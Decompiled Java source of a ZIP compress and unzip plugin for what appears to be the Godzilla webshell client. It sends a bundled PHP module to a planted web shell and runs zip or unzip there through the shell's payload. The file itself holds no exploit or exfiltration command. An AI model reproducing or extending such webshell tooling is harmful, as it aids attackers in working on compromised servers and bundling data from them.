/*     */ package shells.plugins.php;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.GBC;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.GridBagLayout;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JTextField;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "PhpDynamicPayload", Name = "Zip", DisplayName = "ZIP压缩")
/*     */ public class PZip
/*     */   implements Plugin
/*     */ {
/*     */   private static final String CLASS_NAME = "PZip";
/*     */   private ShellEntity shellEntity;
/*     */   private Payload payload;
/*  43 */   private final JPanel panel = new JPanel(new GridBagLayout()); private final JLabel compressSrcDirLabel; private final JLabel compressDestFileLabel; private final JTextField compressDestFileTextField; private final JTextField compressSrcDirTextField;
/*     */   public PZip() {
/*  45 */     GBC gbcLCompressSrcDir = (new GBC(0, 0)).setInsets(5, -40, 0, 0);
/*  46 */     GBC gbcCompressSrcDir = (new GBC(1, 0, 3, 1)).setInsets(5, 20, 0, 0);
/*  47 */     GBC gbcLCompressDestFileLabel = (new GBC(0, 1)).setInsets(5, -40, 0, 0);
/*  48 */     GBC gbcCompressDestFile = (new GBC(1, 1, 3, 1)).setInsets(5, 20, 0, 0);
/*  49 */     GBC gbcZipButton = (new GBC(0, 2)).setInsets(5, -20, 0, 0);
/*  50 */     GBC gbcUnZipButton = (new GBC(0, 2, 5, 1)).setInsets(5, 20, 0, 0);
/*     */     
/*  52 */     this.compressSrcDirLabel = new JLabel("目标文件夹");
/*  53 */     this.compressDestFileLabel = new JLabel("压缩文件");
/*     */     
/*  55 */     this.zipButton = new JButton("压缩");
/*  56 */     this.unZipButton = new JButton("解压");
/*     */     
/*  58 */     this.compressSrcDirTextField = new JTextField(50);
/*  59 */     this.compressDestFileTextField = new JTextField(50);
/*     */ 
/*     */ 
/*     */     
/*  63 */     this.panel.add(this.compressSrcDirLabel, gbcLCompressSrcDir);
/*  64 */     this.panel.add(this.compressSrcDirTextField, gbcCompressSrcDir);
/*  65 */     this.panel.add(this.compressDestFileLabel, gbcLCompressDestFileLabel);
/*  66 */     this.panel.add(this.compressDestFileTextField, gbcCompressDestFile);
/*  67 */     this.panel.add(this.zipButton, gbcZipButton);
/*  68 */     this.panel.add(this.unZipButton, gbcUnZipButton);
/*     */   }
/*     */   private final JButton zipButton; private final JButton unZipButton; private Encoding encoding; private boolean loadState;
/*     */   
/*     */   private void load() {
/*  73 */     if (!this.loadState)
/*     */       try {
/*  75 */         InputStream inputStream = getClass().getResourceAsStream(String.format("assets/%s.php", new Object[] { "PZip" }));
/*  76 */         byte[] binCode = functions.readInputStream(inputStream);
/*  77 */         inputStream.close();
/*  78 */         this.loadState = this.payload.include("PZip", binCode);
/*  79 */         if (this.loadState) {
/*  80 */           Log.log("Load success", new Object[0]);
/*     */         } else {
/*  82 */           Log.log("Load fail", new Object[0]);
/*     */         } 
/*  84 */       } catch (Exception e) {
/*  85 */         Log.error(e);
/*     */       }  
/*     */   }
/*     */   
/*     */   private void zipButtonClick(ActionEvent actionEvent) {
/*  90 */     load();
/*  91 */     if (this.compressDestFileTextField.getText().trim().length() > 0 && this.compressSrcDirTextField.getText().trim().length() > 0) {
/*  92 */       ReqParameter reqParameter = new ReqParameter();
/*  93 */       reqParameter.add("compressFile", this.compressDestFileTextField.getText().trim());
/*  94 */       reqParameter.add("compressDir", this.compressSrcDirTextField.getText().trim());
/*  95 */       String resultString = this.encoding.Decoding(this.payload.evalFunc("PZip", "zip", reqParameter));
/*  96 */       GOptionPane.showMessageDialog(null, resultString, "提示", 1);
/*     */     } else {
/*  98 */       GOptionPane.showMessageDialog(null, "请检查是否填写完整", "提示", 1);
/*     */     } 
/*     */   }
/*     */   private void unZipButtonClick(ActionEvent actionEvent) {
/* 102 */     load();
/* 103 */     if (this.compressDestFileTextField.getText().trim().length() > 0 && this.compressSrcDirTextField.getText().trim().length() > 0) {
/* 104 */       ReqParameter reqParameter = new ReqParameter();
/* 105 */       reqParameter.add("compressFile", this.compressDestFileTextField.getText().trim());
/* 106 */       reqParameter.add("compressDir", this.compressSrcDirTextField.getText().trim());
/* 107 */       String resultString = this.encoding.Decoding(this.payload.evalFunc("PZip", "unZip", reqParameter));
/* 108 */       GOptionPane.showMessageDialog(null, resultString, "提示", 1);
/*     */     } else {
/* 110 */       GOptionPane.showMessageDialog(null, "请检查是否填写完整", "提示", 1);
/*     */     } 
/*     */   }
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 115 */     this.shellEntity = shellEntity;
/* 116 */     this.payload = this.shellEntity.getPayloadModule();
/* 117 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/*     */     
/* 119 */     this.compressSrcDirTextField.setText(this.payload.currentDir());
/* 120 */     this.compressDestFileTextField.setText(this.payload.currentDir() + functions.getLastFileName(this.payload.currentDir()) + ".zip");
/*     */     
/* 122 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 128 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\php\PZip.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */